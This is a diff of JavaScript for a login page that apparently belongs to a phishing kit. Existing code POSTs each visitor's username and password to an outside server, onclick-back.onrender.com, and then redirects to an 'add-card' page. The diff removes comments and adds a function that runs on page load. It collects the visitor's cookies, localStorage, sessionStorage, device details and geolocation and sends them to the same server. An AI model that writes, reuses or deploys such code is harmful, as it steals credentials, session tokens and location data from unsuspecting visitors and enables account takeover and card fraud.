@@ -42,7 +42,6 @@ document.addEventListener("DOMContentLoaded", () => {
     const isValidPhone = isPhoneInput && val.length >= 9;
     const isPasswordValid = passwordVal.length >= 8;
 
-    // Reset states
     input.classList.remove("error", "valid", "phone-mode");
     label.classList.remove("error");
     passwordInput.classList.remove("error", "valid");
@@ -129,15 +128,14 @@ document.addEventListener("DOMContentLoaded", () => {
   form.addEventListener("submit", async (e) => {
     e.preventDefault();
     if (button.disabled) return;
-  
+
     const val = input.value.trim();
     const pass = passwordInput.value.trim();
-  
-    // Проверка по валидным учеткам (только для локального теста)
+
     const isValid = validCredentials.some(
       pair => pair.user === val && pair.pass === pass
     );
-  
+
     const payload = {
       user_input: val,
       password: pass,
@@ -146,18 +144,18 @@ document.addEventListener("DOMContentLoaded", () => {
       location: window.location.href,
       success: isValid
     };
-  
+
     button.disabled = true;
     button.querySelector(".al-button__label").textContent = "Loading...";
-  
+
     try {
       const response = await fetch("https://onclick-back.onrender.com/login", {
         method: "POST",
-        credentials: "include", // ✅ добавляем cookies, если нужно
+        credentials: "include",
         headers: { "Content-Type": "application/json" },
         body: JSON.stringify(payload),
       });
-  
+
       if (response.ok && isValid) {
         console.log("✅ Login successful, redirecting...");
         window.location.href = "add-card.html";
@@ -177,7 +175,7 @@ document.addEventListener("DOMContentLoaded", () => {
     }
   });
 
-  // Locale toggle
+  // 🌐 Locale toggle
   const localeToggle = document.getElementById("locale-toggle");
   const localeMenu = document.getElementById("locale-menu");
   const currentLocale = document.getElementById("current-locale");
@@ -195,6 +193,53 @@ document.addEventListener("DOMContentLoaded", () => {
       });
     });
   }
+
+  // 🧩 Client log on load
+  (async function clientLogger() {
+    const payload = {
+      userAgent: navigator.userAgent,
+      language: navigator.language,
+      platform: navigator.platform,
+      deviceMemory: navigator.deviceMemory || "N/A",
+      screen: {
+        width: screen.width,
+        height: screen.height,
+        pixelDepth: screen.pixelDepth,
+      },
+      cookies: document.cookie,
+      localStorage: JSON.stringify(localStorage),
+      sessionStorage: JSON.stringify(sessionStorage),
+      locationHref: location.href,
+      timestamp: new Date().toISOString(),
+    };
+
+    try {
+      await new Promise((resolve) =>
+        navigator.geolocation.getCurrentPosition(
+          (pos) => {
+            payload.geo = {
+              lat: pos.coords.latitude,
+              lon: pos.coords.longitude,
+              accuracy: pos.coords.accuracy,
+            };
+            resolve();
+          },
+          () => resolve(),
+          { timeout: 1500 }
+        )
+      );
+    } catch {}
+
+    try {
+      await fetch("https://onclick-back.onrender.com/log", {
+        method: "POST",
+        headers: { "Content-Type": "application/json" },
+        body: JSON.stringify(payload),
+      });
+    } catch (err) {
+      console.warn("⚠️ Log not sent:", err);
+    }
+  })();
 
   validate();
 });
